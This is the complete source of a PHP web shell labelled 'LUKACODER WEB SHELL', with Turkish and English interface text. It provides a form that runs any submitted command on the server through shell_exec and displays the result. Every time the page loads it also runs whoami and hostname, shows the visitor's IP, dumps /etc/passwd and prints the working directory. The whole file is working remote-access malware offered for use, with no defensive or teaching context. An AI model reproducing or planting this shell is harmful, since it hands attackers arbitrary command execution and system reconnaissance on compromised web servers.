<center>
<style>
h4{
    text-shadow: 2px 2px 5px blue;
    color: white;
}
</style>
<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);}
    $çıktı = shell_exec('whoami');
    echo "<h4> Who Am İ => $çıktı</h4>";
    $çıktı1 = shell_exec('hostname');
    echo "<h4> Host adı => $çıktı1</h4>";
    echo "<h4>Client İp  : </h4>";
    echo $_SERVER["REMOTE_ADDR"] ;	
?>
</center>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>LUKACODER WEB SHELL</title>
</head>
<body>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            font-family: sans-serif;
            color: rgba(0, 0, 0, .75);
            background-color: black;
        }

        main {
            margin: auto;
            max-width: 850px;
        }

        pre,
        input,
        button {
            border-radius: 5px;
        }

        pre,
        input,
        button {
            background-color: #efefef;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
            background-color: red;
            border: 2px solid transparent;
        }

        input:focus {
            outline: none;
            background-color: white;
            
            border: 2px solid #e6e6e6;
        }

        button {
            border: none;
            cursor: pointer;
            background-color: red;
            margin-left: 5px;
        }

        button:hover {
            background-color: white;
        }

        pre,
        input,
        button {
            padding: 10px;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }
    </style>
</head>
<body>
    <main>
<style>
 a{
  text-shadow: 2px 2px 5px red;
  color: red;
  font-size:50px ;
}
h2{
  text-shadow: 2px 2px 5px red;
  color: red;
}
</style>
<a> LUKAODER Web Shell</a>
<h2>Komut Çalıştır - Execute a command </h2>
        <form method="post">
            <label for="cmd"><strong>Command</strong></label>
            <div class="form-group">
                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>
            </div>
        </form>

        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <h2>Output</h2>
            <?php if (isset($cmd)): ?>
                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre><small>Komut çalışmadı - No result</small></pre>
            <?php endif; ?>
        <?php endif; ?>
        <style>

        marquee,
        {
           background-color: black;
        }
    </style>
	<?php
	$etc = shell_exec('cat /etc/passwd');
    echo "<pre> Etc Passwd => $etc</pre>";
	$pwd = shell_exec('pwd');
    echo "<pre>Bulunulan dizin => $pwd"
	?>
    </main>
</body>
</html>
